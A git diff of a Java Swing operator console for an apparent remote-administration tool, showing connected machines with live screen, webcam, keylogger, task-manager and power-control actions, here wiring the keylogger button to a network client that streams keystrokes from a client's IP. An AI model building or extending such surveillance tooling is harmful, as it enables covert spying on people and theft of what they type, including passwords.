@@ -1,6 +1,8 @@
 import java.awt.*;
 import java.awt.event.MouseAdapter;
 import java.awt.event.MouseEvent;
+import java.awt.event.WindowAdapter;
+import java.awt.event.WindowEvent;
 import java.time.LocalDateTime;
 import java.time.format.DateTimeFormatter;
 import java.util.HashMap;
@@ -11,15 +13,17 @@ import javax.swing.table.DefaultTableModel;
 import javax.swing.tree.DefaultMutableTreeNode;
 
 import config.ConfigManager;
+import network.KeyloggerClient;
+import ui.UIKeylogger;
 
 import java.awt.image.BufferedImage;
 import java.io.File;
 
 public class AdminServerApp extends JFrame {
 
+    private AdminServerController controller;
     private JTextArea eventLog;
     private JPanel clientGrid;
-    private AdminServerController controller;
     private JLabel onlineInfoLabel;
     private Map<String, JLabel> screenLabels = new HashMap<String, JLabel>();
     private Map<String, JPanel> clientCards = new HashMap<String, JPanel>();
@@ -36,6 +40,8 @@ public class AdminServerApp extends JFrame {
     private final Color TEXT = new Color(240, 240, 240);
     private final Color MUTED = new Color(165, 165, 165);
     private final Color BORDER = new Color(80, 28, 32);
+
+    private Map<String, String> clientIpMap = new HashMap<>();
 
     public AdminServerApp() {
         controller = new AdminServerController(this);
@@ -160,37 +166,37 @@ public class AdminServerApp extends JFrame {
     }
 
     private JButton createMenuButton(String text, String iconName, boolean selected) {
-    JButton button = new JButton(text);
+        JButton button = new JButton(text);
 
-    ImageIcon icon = loadIcon(iconName, 22, 22);
-    if (icon != null) {
-        button.setIcon(icon);
+        ImageIcon icon = loadIcon(iconName, 22, 22);
+        if (icon != null) {
+            button.setIcon(icon);
+        }
+
+        button.setIconTextGap(14);
+
+        button.setMaximumSize(new Dimension(Integer.MAX_VALUE, 52));
+        button.setMinimumSize(new Dimension(265, 52));
+        button.setPreferredSize(new Dimension(265, 52));
+        button.setFocusPainted(false);
+        button.setHorizontalAlignment(SwingConstants.LEFT);
+        button.setFont(new Font("Segoe UI", Font.BOLD, 15));
+        button.setCursor(new Cursor(Cursor.HAND_CURSOR));
+
+        if (selected) {
+            button.setForeground(Color.WHITE);
+            button.setBackground(new Color(90, 10, 17));
+            button.setBorder(BorderFactory.createMatteBorder(0, 6, 0, 4, RED));
+        } else {
+            button.setForeground(TEXT);
+            button.setBackground(new Color(9, 10, 12));
+            button.setBorder(BorderFactory.createEmptyBorder(0, 30, 0, 0));
+        }
+
+        button.addActionListener(e -> addLog("[MENU] Open " + text));
+
+        return button;
     }
-
-    button.setIconTextGap(14);
-
-    button.setMaximumSize(new Dimension(Integer.MAX_VALUE, 52));
-    button.setMinimumSize(new Dimension(265, 52));
-    button.setPreferredSize(new Dimension(265, 52));
-    button.setFocusPainted(false);
-    button.setHorizontalAlignment(SwingConstants.LEFT);
-    button.setFont(new Font("Segoe UI", Font.BOLD, 15));
-    button.setCursor(new Cursor(Cursor.HAND_CURSOR));
-
-    if (selected) {
-        button.setForeground(Color.WHITE);
-        button.setBackground(new Color(90, 10, 17));
-        button.setBorder(BorderFactory.createMatteBorder(0, 6, 0, 4, RED));
-    } else {
-        button.setForeground(TEXT);
-        button.setBackground(new Color(9, 10, 12));
-        button.setBorder(BorderFactory.createEmptyBorder(0, 30, 0, 0));
-    }
-
-    button.addActionListener(e -> addLog("[MENU] Open " + text));
-
-    return button;
-}
     private JPanel createDashboard() {
         JPanel wrapper = new JPanel(new BorderLayout());
         wrapper.setBackground(BG);
@@ -406,92 +412,94 @@ public class AdminServerApp extends JFrame {
     }
 
     public void addClientCard(String clientName, String hostname, String ip, String os, String username) {
-    SwingUtilities.invokeLater(() -> {
-        JPanel card = new JPanel(new BorderLayout());
-        card.setBackground(PANEL);
-        card.setBorder(BorderFactory.createCompoundBorder(
+        SwingUtilities.invokeLater(() -> {
+            clientIpMap.put(clientName, ip);
+            JPanel card = new JPanel(new BorderLayout());
+            card.setBackground(PANEL);
+            card.setBorder(BorderFactory.createCompoundBorder(
                 BorderFactory.createLineBorder(BORDER, 1),
                 BorderFactory.createEmptyBorder(12, 14, 12, 14)
-        ));
-        card.setCursor(new Cursor(Cursor.HAND_CURSOR));
+            ));
+            card.setCursor(new Cursor(Cursor.HAND_CURSOR));
 
-        JPanel top = new JPanel(new BorderLayout());
-        top.setOpaque(false);
+            JPanel top = new JPanel(new BorderLayout());
+            top.setOpaque(false);
 
-        JLabel nameLabel = new JLabel(clientName);
+            JLabel nameLabel = new JLabel(clientName);
 
-        ImageIcon icon = loadIcon("computer.png", 20, 20);
-        if (icon != null) {
-            nameLabel.setIcon(icon);
-        }
+            ImageIcon icon = loadIcon("computer.png", 20, 20);
+            if (icon != null) {
+                nameLabel.setIcon(icon);
+            }
 
-        nameLabel.setForeground(TEXT);
-        nameLabel.setFont(new Font("Segoe UI", Font.BOLD, 16));
+            nameLabel.setForeground(TEXT);
+            nameLabel.setFont(new Font("Segoe UI", Font.BOLD, 16));
 
-        JLabel statusLabel = new JLabel("● ONLINE");
-        statusLabel.setForeground(RED);
-        statusLabel.setFont(new Font("Segoe UI", Font.BOLD, 12));
+            JLabel statusLabel = new JLabel("● ONLINE");
+            statusLabel.setForeground(RED);
+            statusLabel.setFont(new Font("Segoe UI", Font.BOLD, 12));
 
-        top.add(nameLabel, BorderLayout.WEST);
-        top.add(statusLabel, BorderLayout.EAST);
+            top.add(nameLabel, BorderLayout.WEST);
+            top.add(statusLabel, BorderLayout.EAST);
 
-        JLabel preview = new JLabel(
-        "<html><div style='text-align:center;color:#b0b0b0;'>"
-                + "<div style='font-size:28px;color:#333333;'>▭</div>"
-                + "CONNECTED CLIENT"
-                + "</div></html>",
-        SwingConstants.CENTER
-);
+            JLabel preview = new JLabel(
+                "<html><div style='text-align:center;color:#b0b0b0;'>"
+                    + "<div style='font-size:28px;color:#333333;'>▭</div>"
+                    + "CONNECTED CLIENT"
+                    + "</div></html>",
+                SwingConstants.CENTER
+            );
 
-        preview.setOpaque(true);
-        preview.setBackground(new Color(10, 12, 15));
-        preview.setForeground(MUTED);
-        preview.setFont(new Font("Segoe UI", Font.PLAIN, 13));
-        preview.setBorder(BorderFactory.createLineBorder(new Color(65, 65, 70), 1));
+            preview.setOpaque(true);
+            preview.setBackground(new Color(10, 12, 15));
+            preview.setForeground(MUTED);
+            preview.setFont(new Font("Segoe UI", Font.PLAIN, 13));
+            preview.setBorder(BorderFactory.createLineBorder(new Color(65, 65, 70), 1));
 
-        screenLabels.put(clientName, preview);
+            screenLabels.put(clientName, preview);
 
-        JPanel infoPanel = new JPanel(new GridLayout(2, 2, 10, 6));
-        infoPanel.setBackground(PANEL);
-        infoPanel.setBorder(BorderFactory.createEmptyBorder(10, 0, 0, 0));
+            JPanel infoPanel = new JPanel(new GridLayout(2, 2, 10, 6));
+            infoPanel.setBackground(PANEL);
+            infoPanel.setBorder(BorderFactory.createEmptyBorder(10, 0, 0, 0));
 
-        infoPanel.add(createInfoLabel(" IP: " + ip, TEXT));
-        infoPanel.add(createInfoLabel(" User: " + username, RED));
-        infoPanel.add(createInfoLabel(" Host: " + hostname, TEXT));
-        infoPanel.add(createInfoLabel(" OS: " + os, TEXT));
+            infoPanel.add(createInfoLabel(" IP: " + ip, TEXT));
+            infoPanel.add(createInfoLabel(" User: " + username, RED));
+            infoPanel.add(createInfoLabel(" Host: " + hostname, TEXT));
+            infoPanel.add(createInfoLabel(" OS: " + os, TEXT));
 
-        card.add(top, BorderLayout.NORTH);
-        card.add(preview, BorderLayout.CENTER);
-        card.add(infoPanel, BorderLayout.SOUTH);
-        card.addMouseListener(new MouseAdapter() {
-            public void mouseClicked(MouseEvent e) {
-                if (e.getClickCount() == 2) {
-                    addLog("[SCREEN] Open big action panel for " + clientName);
-                    openClientActionDialog(clientName);
+            card.add(top, BorderLayout.NORTH);
+            card.add(preview, BorderLayout.CENTER);
+            card.add(infoPanel, BorderLayout.SOUTH);
+            card.addMouseListener(new MouseAdapter() {
+                public void mouseClicked(MouseEvent e) {
+                    if (e.getClickCount() == 2) {
+                        addLog("[SCREEN] Open big action panel for " + clientName);
+                        openClientActionDialog(clientName);
+                    }
                 }
-            }
 
-            public void mouseEntered(MouseEvent e) {
-                card.setBorder(BorderFactory.createCompoundBorder(
-                        BorderFactory.createLineBorder(RED, 1),
-                        BorderFactory.createEmptyBorder(12, 14, 12, 14)
-                ));
-            }
+                public void mouseEntered(MouseEvent e) {
+                    card.setBorder(BorderFactory.createCompoundBorder(
+                            BorderFactory.createLineBorder(RED, 1),
+                            BorderFactory.createEmptyBorder(12, 14, 12, 14)
+                    ));
+                }
 
-            public void mouseExited(MouseEvent e) {
-                card.setBorder(BorderFactory.createCompoundBorder(
-                        BorderFactory.createLineBorder(BORDER, 1),
-                        BorderFactory.createEmptyBorder(12, 14, 12, 14)
-                ));
-            }
+                public void mouseExited(MouseEvent e) {
+                    card.setBorder(BorderFactory.createCompoundBorder(
+                            BorderFactory.createLineBorder(BORDER, 1),
+                            BorderFactory.createEmptyBorder(12, 14, 12, 14)
+                    ));
+                }
+            });
+
+
+            clientCards.put(clientName, card);
+            clientGrid.add(card);
+            clientGrid.revalidate();
+            clientGrid.repaint();
         });
-
-        clientCards.put(clientName, card);
-        clientGrid.add(card);
-        clientGrid.revalidate();
-        clientGrid.repaint();
-    });
-}
+    }
 // Hàm này sẽ được gọi từ ClientHandler khi nhận được hình ảnh mới từ client
     public void updateClientScreen(String clientName, BufferedImage image) {
     SwingUtilities.invokeLater(() -> {
@@ -525,11 +533,12 @@ public class AdminServerApp extends JFrame {
     });
 }
 // Hàm này sẽ được gọi khi client ngắt kết nối hoặc bị ngắt kết nối
-public void removeClientCard(String clientName) {
+    public void removeClientCard(String clientName) {
     SwingUtilities.invokeLater(() -> {
         JPanel card = clientCards.get(clientName);
 
         if (card != null) {
+            clientIpMap.remove(clientName);
             clientGrid.remove(card);
             clientCards.remove(clientName);
             screenLabels.remove(clientName);
@@ -541,17 +550,18 @@ public void removeClientCard(String clientName) {
     });
 }
     public void clearClientCards() {
-    SwingUtilities.invokeLater(() -> {
-        clientGrid.removeAll();
-        screenLabels.clear();
-        clientCards.clear();
-        latestScreens.clear();
-        bigScreenLabels.clear();
+        SwingUtilities.invokeLater(() -> {
+            clientIpMap.clear();
+            clientGrid.removeAll();
+            screenLabels.clear();
+            clientCards.clear();
+            latestScreens.clear();
+            bigScreenLabels.clear();
 
-        clientGrid.revalidate();
-        clientGrid.repaint();
-    });
-}
+            clientGrid.revalidate();
+            clientGrid.repaint();
+        });
+    }
 
     private JPanel createScreenTab() {
         JPanel panel = createBaseTabPanel();
@@ -667,8 +677,6 @@ public void removeClientCard(String clientName) {
 
         return panel;
     }
-
-    
 
     private JPanel createPowerTab() {
         JPanel panel = new JPanel(new GridLayout(2, 2, 20, 20));
@@ -894,186 +902,208 @@ public void removeClientCard(String clientName) {
     }
 
     private ImageIcon loadIcon(String fileName, int width, int height) {
-    String[] paths = {
-            "assets/icons/" + fileName,
-            "CODE/AdminServer/assets/icons/" + fileName,
-            "../assets/icons/" + fileName
-    };
+        String[] paths = {
+                "assets/icons/" + fileName,
+                "CODE/AdminServer/assets/icons/" + fileName,
+                "../assets/icons/" + fileName
+        };
 
-    for (int i = 0; i < paths.length; i++) {
-        File file = new File(paths[i]);
+        for (int i = 0; i < paths.length; i++) {
+            File file = new File(paths[i]);
 
-        if (file.exists()) {
-            ImageIcon icon = new ImageIcon(file.getAbsolutePath());
+            if (file.exists()) {
+                ImageIcon icon = new ImageIcon(file.getAbsolutePath());
 
-            Image image = icon.getImage();
-            Image scaledImage = image.getScaledInstance(width, height, Image.SCALE_SMOOTH);
+                Image image = icon.getImage();
+                Image scaledImage = image.getScaledInstance(width, height, Image.SCALE_SMOOTH);
 
-            return new ImageIcon(scaledImage);
-        }
-    }
-
-    try {
-        File classPath = new File(
-                AdminServerApp.class
-                        .getProtectionDomain()
-                        .getCodeSource()
-                        .getLocation()
-                        .toURI()
-        );
-
-        File projectFolder = classPath.getParentFile();
-        File iconFile = new File(projectFolder, "assets/icons/" + fileName);
-
-        if (iconFile.exists()) {
-            ImageIcon icon = new ImageIcon(iconFile.getAbsolutePath());
-
-            Image image = icon.getImage();
-            Image scaledImage = image.getScaledInstance(width, height, Image.SCALE_SMOOTH);
-
-            return new ImageIcon(scaledImage);
+                return new ImageIcon(scaledImage);
+            }
         }
 
-    } catch (Exception e) {
-        System.out.println("Loi khi tim icon: " + e.getMessage());
+        try {
+            File classPath = new File(
+                    AdminServerApp.class
+                            .getProtectionDomain()
+                            .getCodeSource()
+                            .getLocation()
+                            .toURI()
+            );
+
+            File projectFolder = classPath.getParentFile();
+            File iconFile = new File(projectFolder, "assets/icons/" + fileName);
+
+            if (iconFile.exists()) {
+                ImageIcon icon = new ImageIcon(iconFile.getAbsolutePath());
+
+                Image image = icon.getImage();
+                Image scaledImage = image.getScaledInstance(width, height, Image.SCALE_SMOOTH);
+
+                return new ImageIcon(scaledImage);
+            }
+
+        } catch (Exception e) {
+            System.out.println("Loi khi tim icon: " + e.getMessage());
+        }
+
+        System.out.println("Khong tim thay icon: " + fileName);
+        System.out.println("Working Directory = " + System.getProperty("user.dir"));
+
+        return null;
     }
-
-    System.out.println("Khong tim thay icon: " + fileName);
-    System.out.println("Working Directory = " + System.getProperty("user.dir"));
-
-    return null;
-}
 
     // Hàm này sẽ được gọi khi người dùng double-click vào client
     private void openBigScreen(String clientName) {
-    JDialog dialog = new JDialog(this, "Screen Monitor - " + clientName, false);
-    dialog.setSize(1000, 650);
-    dialog.setLocationRelativeTo(this);
-    dialog.setLayout(new BorderLayout());
-    dialog.getContentPane().setBackground(BG);
+        JDialog dialog = new JDialog(this, "Screen Monitor - " + clientName, false);
+        dialog.setSize(1000, 650);
+        dialog.setLocationRelativeTo(this);
+        dialog.setLayout(new BorderLayout());
+        dialog.getContentPane().setBackground(BG);
 
-    JLabel title = new JLabel("  LIVE SCREEN - " + clientName);
-    title.setForeground(TEXT);
-    title.setFont(new Font("Segoe UI", Font.BOLD, 22));
-    title.setOpaque(true);
-    title.setBackground(BG);
-    title.setBorder(BorderFactory.createCompoundBorder(
-            BorderFactory.createMatteBorder(1, 1, 1, 1, RED),
-            BorderFactory.createEmptyBorder(14, 18, 14, 18)
-    ));
+        JLabel title = new JLabel("  LIVE SCREEN - " + clientName);
+        title.setForeground(TEXT);
+        title.setFont(new Font("Segoe UI", Font.BOLD, 22));
+        title.setOpaque(true);
+        title.setBackground(BG);
+        title.setBorder(BorderFactory.createCompoundBorder(
+                BorderFactory.createMatteBorder(1, 1, 1, 1, RED),
+                BorderFactory.createEmptyBorder(14, 18, 14, 18)
+        ));
 
-    JLabel screen = new JLabel("WAITING SCREEN...", SwingConstants.CENTER);
-    screen.setOpaque(true);
-    screen.setBackground(Color.BLACK);
-    screen.setForeground(MUTED);
-    screen.setFont(new Font("Consolas", Font.BOLD, 24));
-    screen.setBorder(BorderFactory.createLineBorder(RED, 1));
+        JLabel screen = new JLabel("WAITING SCREEN...", SwingConstants.CENTER);
+        screen.setOpaque(true);
+        screen.setBackground(Color.BLACK);
+        screen.setForeground(MUTED);
+        screen.setFont(new Font("Consolas", Font.BOLD, 24));
+        screen.setBorder(BorderFactory.createLineBorder(RED, 1));
 
-    bigScreenLabels.put(clientName, screen);
+        bigScreenLabels.put(clientName, screen);
 
-    BufferedImage lastImage = latestScreens.get(clientName);
+        BufferedImage lastImage = latestScreens.get(clientName);
 
-    if (lastImage != null) {
-        Image bigImg = lastImage.getScaledInstance(
-                1000,
-                560,
-                Image.SCALE_SMOOTH
-        );
+        if (lastImage != null) {
+            Image bigImg = lastImage.getScaledInstance(
+                    1000,
+                    560,
+                    Image.SCALE_SMOOTH
+            );
 
-        screen.setText("");
-        screen.setIcon(new ImageIcon(bigImg));
+            screen.setText("");
+            screen.setIcon(new ImageIcon(bigImg));
+        }
+
+        dialog.add(title, BorderLayout.NORTH);
+        dialog.add(screen, BorderLayout.CENTER);
+
+        dialog.addWindowListener(new java.awt.event.WindowAdapter() {
+            public void windowClosing(java.awt.event.WindowEvent e) {
+                bigScreenLabels.remove(clientName);
+            }
+        });
+
+        dialog.setVisible(true);
     }
 
-    dialog.add(title, BorderLayout.NORTH);
-    dialog.add(screen, BorderLayout.CENTER);
-
-    dialog.addWindowListener(new java.awt.event.WindowAdapter() {
-        public void windowClosing(java.awt.event.WindowEvent e) {
-            bigScreenLabels.remove(clientName);
-        }
-    });
-
-    dialog.setVisible(true);
-}
 
     public void updateOnlineCount(int count) {
-    SwingUtilities.invokeLater(() -> {
-        if (onlineInfoLabel != null) {
-            onlineInfoLabel.setText(
+        SwingUtilities.invokeLater(() -> {
+            if (onlineInfoLabel != null) {
+                onlineInfoLabel.setText(
                     "<html><div style='padding-left:26px;color:white;'>"
                             + "<span style='color:#ef2331;'>●</span> Online: " + count + "<br>"
                             + "Port: <span style='color:#ef2331;'>1412</span>"
                             + "</div></html>"
-            );
-        }
-    });
-}
+                );
+             }
+        });
+    }
     private void openClientActionDialog(String clientName) {
-    JDialog dialog = new JDialog(this, "Client Actions - " + clientName, false);
-    dialog.setSize(420, 420);
-    dialog.setLocationRelativeTo(this);
-    dialog.setLayout(new BorderLayout());
+        JDialog dialog = new JDialog(this, "Client Actions - " + clientName, false);
+        dialog.setSize(420, 420);
+        dialog.setLocationRelativeTo(this);
+            dialog.setLayout(new BorderLayout());
     dialog.getContentPane().setBackground(BG);
 
-    JLabel title = new JLabel("  ACTIONS FOR " + clientName);
-    title.setForeground(TEXT);
-    title.setFont(new Font("Segoe UI", Font.BOLD, 20));
-    title.setOpaque(true);
-    title.setBackground(BG);
-    title.setBorder(BorderFactory.createCompoundBorder(
-            BorderFactory.createMatteBorder(1, 1, 1, 1, RED),
-            BorderFactory.createEmptyBorder(14, 18, 14, 18)
-    ));
+        JLabel title = new JLabel("  ACTIONS FOR " + clientName);
+        title.setForeground(TEXT);
+        title.setFont(new Font("Segoe UI", Font.BOLD, 20));
+        title.setOpaque(true);
+        title.setBackground(BG);
+        title.setBorder(BorderFactory.createCompoundBorder(
+                BorderFactory.createMatteBorder(1, 1, 1, 1, RED),
+                BorderFactory.createEmptyBorder(14, 18, 14, 18)
+        ));
 
-    JPanel actionPanel = new JPanel(new GridLayout(4, 2, 12, 12));
-    actionPanel.setBackground(BG);
-    actionPanel.setBorder(BorderFactory.createEmptyBorder(20, 20, 20, 20));
+        JPanel actionPanel = new JPanel(new GridLayout(4, 2, 12, 12));
+        actionPanel.setBackground(BG);
+        actionPanel.setBorder(BorderFactory.createEmptyBorder(20, 20, 20, 20));
 
-    JButton screenBtn = createRedButton("Screen Monitor");
-    JButton webcamBtn = createDarkButton("Webcam");
-    JButton keyloggerBtn = createDarkButton("Keylogger");
-    JButton taskBtn = createDarkButton("Task Manager");
-    JButton powerBtn = createDarkButton("System Power");
-    JButton closeBtn = createDarkButton("Close");
+        // các button chọn chức năng
+        JButton screenBtn = createRedButton("Screen Monitor");
+        JButton webcamBtn = createDarkButton("Webcam");
+        JButton keyloggerBtn = createDarkButton("Keylogger");
+        JButton taskBtn = createDarkButton("Task Manager");
+        JButton powerBtn = createDarkButton("System Power");
+        JButton closeBtn = createDarkButton("Close");
 
-    screenBtn.addActionListener(e -> {
-        addLog("[SCREEN] Open screen for " + clientName);
-        openBigScreen(clientName);
-    });
+        screenBtn.addActionListener(e -> {
+            addLog("[SCREEN] Open screen for " + clientName);
+            openBigScreen(clientName);
+        });
 
-    webcamBtn.addActionListener(e -> openWebcamWindow(clientName));
+        webcamBtn.addActionListener(e -> {
+            addLog("[WEBCAM] Open webcam for " + clientName);
+            openWebcamWindow(clientName);
+        });
+
+        keyloggerBtn.addActionListener(e -> {
+            String clientIp = clientIpMap.get(clientName);
+            addLog("[KEYLOGGER] Open keylogger for " + clientName+" width IP is "+clientIp);
+            if (clientIp == null) {
+                addLog("[KEYLOGGER] Không tìm thấy IP của " + clientName);
+                return;
+            }
+            UIKeylogger uiKeylogger = new UIKeylogger(clientName);
+
+            KeyloggerClient keyloggerClient = new KeyloggerClient(clientIp,uiKeylogger);
+            keyloggerClient.start();
+
+            uiKeylogger.addWindowListener(new WindowAdapter() {
+                @Override
+                public void windowClosing(WindowEvent e) {
+                    keyloggerClient.stop();
+                }
+            });
+
+            uiKeylogger.setVisible(true);
+        });
+
+        taskBtn.addActionListener(e -> {
+            addLog("[TASK] Open task manager for " + clientName);
+            openTaskManagerWindow(clientName);
+        });
 
 
-    keyloggerBtn.addActionListener(e -> {
-        addLog("[KEYLOGGER] Open keylogger for " + clientName);
-    });
-
-    taskBtn.addActionListener(e -> {
-    addLog("[TASK] Open task manager for " + clientName);
-    openTaskManagerWindow(clientName);
-});
+        powerBtn.addActionListener(e -> {
+            addLog("[POWER] Open power control for " + clientName);
+            openPowerControlDialog(clientName);
+        });
 
 
-    powerBtn.addActionListener(e -> {
-    addLog("[POWER] Open power control for " + clientName);
-    openPowerControlDialog(clientName); // Thêm dòng này để gọi hộp thoại của bạn
-});
+        closeBtn.addActionListener(e -> dialog.dispose());
 
+        actionPanel.add(screenBtn);
+        actionPanel.add(webcamBtn);
+        actionPanel.add(keyloggerBtn);
+        actionPanel.add(taskBtn);
+        actionPanel.add(powerBtn);
+        actionPanel.add(closeBtn);
 
-    closeBtn.addActionListener(e -> dialog.dispose());
+        dialog.add(title, BorderLayout.NORTH);
+        dialog.add(actionPanel, BorderLayout.CENTER);
 
-    actionPanel.add(screenBtn);
-    actionPanel.add(webcamBtn);
-    actionPanel.add(keyloggerBtn);
-    actionPanel.add(taskBtn);
-    actionPanel.add(powerBtn);
-    actionPanel.add(closeBtn);
-
-    dialog.add(title, BorderLayout.NORTH);
-    dialog.add(actionPanel, BorderLayout.CENTER);
-
-    dialog.setVisible(true);
-}
+        dialog.setVisible(true);
+    }
 
     private void openWebcamWindow(String clientName) {
         JFrame frame = new JFrame("Webcam - " + clientName);
